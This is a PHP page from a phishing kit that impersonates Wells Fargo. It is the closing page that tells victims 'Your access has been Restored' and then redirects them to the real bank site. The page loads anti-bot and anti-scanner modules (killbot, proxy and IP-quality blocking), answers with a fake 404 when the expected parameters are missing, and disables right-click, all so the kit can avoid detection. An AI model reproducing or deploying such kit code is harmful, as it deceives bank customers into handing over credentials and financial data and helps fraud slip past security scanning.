<?php
session_start();
error_reporting(0);


include('../Against_bot/east_a/useragent_bot.php');
require '../Against_bot/east_b/main.php';
include('panel/config.php');
if ($api_protection =="true") {
	include('../Against_bot/antipw.php');
	include('../Against_bot/ipp.php');
	include('../Against_bot/ipqual.php');
	include('../Against_bot/killbot.php');
	include('../Against_bot/east_b/proxyblock.php');
 }
include('../Against_bot/east_b/random.php');



$key = substr(sha1(mt_rand()),1,25);

if (!isset($_GET['origin']) || !isset($_GET['langPref'])) {
        header("HTTP/1.0 404 Not Found");
        exit();
    }
    
if (!isset($_SESSION['WELL_SPOX'])) {
  header("Location: index");
  exit();
}


?>
<!DOCTYPE html>
<html lang="en" oncontextmenu="return false"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="stylesheet" href="./assets/wfui.11e17f8556e3db89e122.chunk.css">
	<link rel="stylesheet" href="./assets/main.5f0b810d3d898b39bb7a.chunk.css">
	<style>
		span.logoutImageUrlsWrapper {
			display:none;
		}
	</style>


<meta http-equiv="refresh" content="2; URL=https://www.wellsfargo.com/about/diversity/" />

<link rel="apple-touch-icon" sizes="120x120" href="https://www01.wellsfargomedia.com/assets/images/icons/apple-touch-icon_120x120.png">
<link rel="apple-touch-icon" sizes="180x180" href="https://www01.wellsfargomedia.com/assets/images/icons/apple-touch-icon_180x180.png">
<link rel="icon" sizes="128x128" href="https://www.wellsfargo.com/assets/images/icons/icon-normal_128x128.png">
<link rel="icon" sizes="192x192" href="https://www.wellsfargo.com/assets/images/icons/icon-hires_192x192.png">
<link rel="icon" href="https://www.wellsfargo.com/assets/images/icons/favicon_16x32x48.png">







<title>Wells Fargo - Thank you for visiting</title></head>
<body class="bodyWFFonts useWFFonts" data-block-scrolling="false" data-navigation-menu-open="false">
	

	<span class="logoutImageUrlsWrapper" id="logout_src">
    
</span>

	<div id="root" class="viewport"><div data-app-container="" style="display: flex; flex-flow: column nowrap; flex: 1 1 auto;"><div class="base__appWrapper___1z7Dj"><div tabindex="-1" class="visuallyHidden" data-testid="first-focus">Wells Fargo - Thank you for visiting</div><div style="display: flex; flex-flow: column nowrap; flex: 1 1 100%;"><div class="Page__swipeableContainer___3NFVH"><div data-page-wrapper="" style="display: flex; flex-flow: column nowrap; flex: 1 0 auto;"><nav class="WFMasthead__masthead___2qCXs WFMasthead__fixed___26U3T  WFMasthead__desktop___1m0H-" style="display: flex; flex-flow: column nowrap;"><div style="display: flex; flex-flow: column nowrap; flex: 1 1 auto; align-items: center; justify-content: center;"><div class="WFMasthead__logoBar___vKJhW" style="display: flex; flex-flow: column nowrap; flex: 1 1 auto; align-items: center;"><div class="Guttered__guttered___3glPq Guttered__desktop___1S7rz WFMasthead__gutter___wEx1t WFMasthead__desktop___1m0H-"><div class="WFMasthead__logo___2Xb7s" style="display: inline-flex; flex-flow: row nowrap;"><button type="button" class="Button__button___3y0lE WellsFargoLogo__button___2BAYD" role="link"><span class="visuallyHidden">WELLS FARGO</span><svg viewBox="0 0 148 16" aria-hidden="true" role="img" class="WellsFargoLogoIcon__logo___2leTg WellsFargoLogoIcon__desktop___3sxW8" focusable="false"><path fill="#ffffff" d="
  M31.5783,10.22 L33.0183,10.22 L33.0183,15 L20.9983,15 L20.9983,13.26 L22.6983,13.26 L22.6983,2.74 L19.94,2.74 L16.44,15 L13.66,15 L10.82,4.84
  L7.9,15 L5.12,15 L1.6,2.74 L0,2.74 L0,1 L6.52,1 L6.52,2.74 L4.64,2.74 L6.98,11.18 L9.78,1 L12.66,1 L15.52,11.2 L17.82,2.74 L15.86,2.74 L15.86,1
  L32.8185,1 L32.8185,5.54 L31.3785,5.54 L31.2385,5 C30.7985,3.32 30.3385,2.74 28.9985,2.74 L25.6785,2.74 L25.6785,6.96 L29.6985,6.96 C29.8509872,7.25655731
  29.9266299,7.5866346 29.9185,7.92 C29.9289227,8.26639109 29.8533362,8.60996586 29.6985,8.92 L25.6785,8.92 L25.6785,13.26 L29.1385,13.26 C30.4385,13.26
  31.0185,12.7 31.4185,10.92 L31.5783,10.22 Z M44.2172,10.92 C43.8172,12.7 43.2572,13.26 41.9372,13.26 L39.1572,13.26 L39.1572,2.74 L41.0572,2.74 L41.0572,1
  L34.4772,1 L34.4772,2.74 L36.1772,2.74 L36.1772,13.26 L34.4772,13.26 L34.4772,15 L45.8172,15 L45.8172,10.22 L44.3772,10.22 L44.2172,10.92 Z M56.8161,10.92
  C56.4161,12.7 55.8561,13.26 54.5361,13.26 L51.7561,13.26 L51.7561,2.74 L53.6561,2.74 L53.6561,1 L47.0761,1 L47.0761,2.74 L48.7761,2.74 L48.7761,13.26 L47.0761,13.26
  L47.0761,15 L58.4161,15 L58.4161,10.22 L56.9761,10.22 L56.8161,10.92 Z M67.3548,6.8 L64.8148,6.22 C63.3348,5.88 62.7148,5.3 62.7148,4.32 C62.7148,3.14 63.6548,2.4
  65.4948,2.4 C67.3348,2.4 68.4148,3.06 68.8348,4.62 L69.0148,5.3 L70.4548,5.3 L70.4548,1.84 C68.8830796,1.03158224 67.1423274,0.606665867 65.3749,0.6 C61.9549,0.6
  59.7549,2.24 59.7549,4.88 C59.7549,6.92 61.0349,8.42 63.4949,8.96 L66.0349,9.52 C67.6549,9.88 68.2549,10.52 68.2549,11.58 C68.2549,12.88 67.2749,13.6 65.3149,13.6
  C63.0949,13.6 61.9549,12.72 61.4549,11.04 L61.1949,10.18 L59.7549,10.18 L59.7549,14.1 C61.5849502,15.0113218 63.6113126,15.4578084 65.6549,15.4 C69.0149,15.4 71.2149,13.72
  71.2149,11.1 C71.2148,8.9 69.8747,7.38 67.3548,6.8 Z M86.6329,2.74 C87.9729,2.74 88.4329,3.32 88.8729,5 L89.0129,5.54 L90.4529,5.54 L90.4529,1 L78.3929,1 L78.3929,2.74 L80.0929,
  2.74 L80.0929,13.26 L78.3929,13.26 L78.3929,15 L85.0729,15 L85.0729,13.26 L83.0729,13.26 L83.0729,9.18 L87.1929,9.18 C87.3477086,8.86995608 87.4232935,8.52638836
  87.4129,8.18 C87.4210727,7.84663029 87.3454276,7.51654256 87.1929,7.22 L83.0729,7.22 L83.0729,2.74 L86.6329,2.74 Z M117.1107,13.42 C117.350603,13.9403466
  117.350603,14.5396534 117.1107,15.06 C116.593408,15.1270209 116.072315,15.1604243 115.5507,15.16 C113.6107,15.16 112.6707,14.36 112.4507,12.5 L112.3707,11.8 C112.1307,9.78
  111.4707,9 109.2707,9 L108.1707,9 L108.1707,13.26 L110.0707,13.26 L110.0707,15 L97.4921,15 L97.4921,13.26 L99.1321,13.26 L98.2121,10.76 L93.0121,10.76 L92.0921,13.26 L93.7721,
  13.26 L93.7721,15 L88.4721,15 L88.4721,13.26 L89.8721,13.26 L94.772,1 L97.432,1 L102.432,13.26 L105.1907,13.26 L105.1907,2.74 L103.4907,2.74 L103.4907,1 L111.5307,1 C114.3907,
  1 116.2507,2.42 116.2507,4.7 C116.236826,5.65544044 115.842919,6.56599554 115.156084,7.23031176 C114.469248,7.89462798 113.546072,8.25797324 112.5907,8.24 L112.5907,
  8.3 C113.320265,8.29049748 114.022729,8.57612277 114.538653,9.09204674 C115.054577,9.60797071 115.340203,10.3104352 115.3307,11.04 L115.4107,11.78 C115.5307,12.94 115.7707,
  13.46 116.6907,13.46 C116.831581,13.4586084 116.972089,13.4452267 117.1107,13.42 Z M97.5719,9.06 L95.6119,3.76 L93.6519,9.06 L97.5719,9.06 Z M113.2307,4.98 C113.2307,
  3.52 112.3307,2.74 110.5307,2.74 L108.1707,2.74 L108.1707,7.24 L110.5307,7.24 C112.3108,7.24 113.2307,6.42 113.2307,4.98 Z M125.1745,8.62 C125.161819,8.96019815 125.237622,
  9.29786628 125.3945,9.6 L127.7745,9.6 L127.7745,13.14 C127.025969,13.4478108 126.223838,13.6041585 125.4145,13.6 C122.5345,13.6 121.0345,11.54 121.0345,7.98 C121.0345,
  4.42 122.5345,2.36 125.2545,2.36 C126.847915,2.27805546 128.291943,3.29300049 128.7545,4.82 L128.9745,5.38 L130.4145,5.38 L130.4145,1.8 C128.769872,0.975783763 126.954079,
  0.550956677 125.1145,0.56 C120.7145,0.56 117.7545,3.5 117.7545,8 C117.7545,12.52 120.6345,15.4 125.1145,15.4 C127.070757,15.3481445 128.988059,14.8414289 130.7145,
  13.92 L130.7145,7.68 L125.3945,7.68 C125.23997,7.96860667 125.164097,8.29279214 125.1745,8.62 Z M147.4382,7.98 C147.4382,12.0889985 144.107199,15.42 139.9982,15.42 C135.889201,
  15.42 132.5582,12.0889985 132.5582,7.98 C132.5582,3.87100146 135.889201,0.54 139.9982,0.54 C144.107199,0.54 147.4382,3.87100146 147.4382,7.98 Z M144.1582,7.98 C144.1582,
  4.44 142.6982,2.38 139.9982,2.38 C137.2982,2.38 135.8382,4.44 135.8382,7.98 C135.8382,11.54 137.2782,13.58 139.9982,13.58 C142.7182,13.58 144.1582,11.54 144.1582,7.98 Z
" fill-rule="nonzero"></path></svg></button></div><div class="MenuBar__bar___wO6KM" style="display: flex; flex-flow: row nowrap; align-items: center;"><ul style="display: flex; flex-flow: row nowrap; align-items: center;"><li><a data-accessible-id="CFHELWVG" role="link" tabindex="0"></a></li><li><a data-accessible-id="KDIJBFHK" role="link" tabindex="0"> </a></li></ul></div></div><div class="KeyLine__keyLine___3ubiN"></div></div></div></nav><div class="Page__page____A8cG Page__useWFFonts___18j_Q Page__useAltMasthead___3xvnU Page__desktop___3k0uo App__pageContainer___1NbcZ" data-page-container="" style="display: flex; flex-flow: column nowrap; flex: 1 0 auto;"><div style="display: flex; flex-flow: column nowrap; flex: 1 1 auto; align-items: center;"><div class="PageContent__content___3yKyO" style="padding-top: 60px; display: flex; flex-flow: column nowrap; flex: 1 1 auto; align-items: center;"><div data-page-content="" class="Guttered__guttered___3glPq Guttered__desktop___1S7rz" style="display: flex; flex-flow: column nowrap; flex: 1 1 auto; align-items: stretch;"><div class="LogOff__containerWrap___3VozT antiClickjackContent"><div data-testid="signOff-messages" class="SignOffMessages__container___38UeH"><h1 tabindex="-1" class="SignOffMessages__thankyouMessage___1LJKc">Thank you! Your access has been Restored.</h1><center><img src="assets/img/congra.png" alt="Smiley face" height="42" width="42"></center><p class="SignOffMessages__messageBody___37poR">Your account has been verified and all your services has been restored, we will call you later if we need something else, Thanks for being a loyal customer.</p></div><div class="IaAds__container___3DVbq" data-testid="ia-ads"></div><div class="LogOff__disclosure___1ikhe"><div class=" HtmlBlock__container___3u8HC"><div class="c20equal">Equal Housing Lender</div></div><p>Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.</p><div class=" HtmlBlock__container___3u8HC"><div class="c20notnot" id="c20nnm"><strong>Investment and Insurance Products are:</strong> <ul> <li><strong>Not Insured by the FDIC or Any Federal Government Agency</strong></li> <li><strong>Not a Deposit or Other Obligation of, or Guaranteed by, the Bank or Any Bank Affiliate</strong></li> <li><strong>Subject to Investment Risks, Including Possible Loss of the Principal Amount Invested</strong></li> </ul> </div></div><p>Investment products and services are offered through <span lang="en-US">Wells Fargo Advisors</span>. <span lang="en-US">Wells Fargo Advisors</span> is a trade name used by <span lang="en-US">Wells Fargo Clearing Services</span>, LLC (WFCS) and <span lang="en-US">Wells Fargo Advisors Financial Network</span>, LLC, Members SIPC, separate registered broker-dealers and non-bank affiliates of <span lang="en-US">Wells Fargo &amp; Company</span>.</p></div></div></div></div></div><div class="WFFooter__footer___1WB8-" style="display: flex; flex-flow: row nowrap; align-items: center; justify-content: center;"><div class="Guttered__guttered___3glPq Guttered__desktop___1S7rz"><div><ul class="Links__links___1Uwym"><li><a data-accessible-id="WKMVPTFK" role="link" tabindex="0"><span>About Wells Fargo</span></a></li><li><a data-accessible-id="ESJDILWE" role="link" tabindex="0"><span>Online Access Agreement</span></a></li><li><a data-accessible-id="GZRRMZQP" role="link" tabindex="0"><span>Privacy, Cookies, Security &amp; Legal</span></a></li><li><a data-accessible-id="LOALTXKQ" role="link" tabindex="0"><span>Notice of Data Collection</span></a></li><li><a data-accessible-id="KBINUIHC" role="link" tabindex="0"><span>Report Email Fraud</span></a></li><li><a data-accessible-id="RMCEBRLS" role="link" tabindex="0"><span>Security Center</span></a></li><li><a data-accessible-id="CAMGPWBO" role="link" tabindex="0"><span>Sitemap</span></a></li><li><a data-accessible-id="TLXLRELT" role="link" tabindex="0"><span>Ad Choices</span></a></li></ul><div class="CopyRight__copyright___3aFR-">© 1999 - 2021 Wells Fargo. All rights reserved. NMLSR ID 399801</div></div></div></div></div></div></div></div></div></div></div>
	

	

	

	

	
	
	
	


<div><div tabindex="-1" id="accessibilityFocus" class="AccessibilityFocus__accessibilityFocus___cqXwn"></div></div></body></html>